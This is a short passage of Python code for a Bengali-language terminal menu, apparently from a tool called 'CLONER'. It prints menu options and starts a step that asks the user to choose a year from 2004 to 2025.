        console.print("[4] 🗑️ সব ডাটা ক্লিয়ার")
        console.print("[0] 🚪 এক্সিট")
        choice = console.input(f"\n[bold green]{YOUR_NAME}[/bold green][white]@[/white][bold cyan]CLONER[/bold cyan] ~ [/bold]")
        
        if choice == "1":
            console.print(f"\n[bold cyan]═══ প্রথম ধাপ: বছর নির্বাচন ═══[/bold cyan]")
            console.print("[dim]উপলব্ধ বছর: 2004 থেকে 2025 পর্যন্ত[/dim]")
            try:
                year = int(console.input("[yellow]বছর দিন (যেমন: 2020): [/yellow]"))
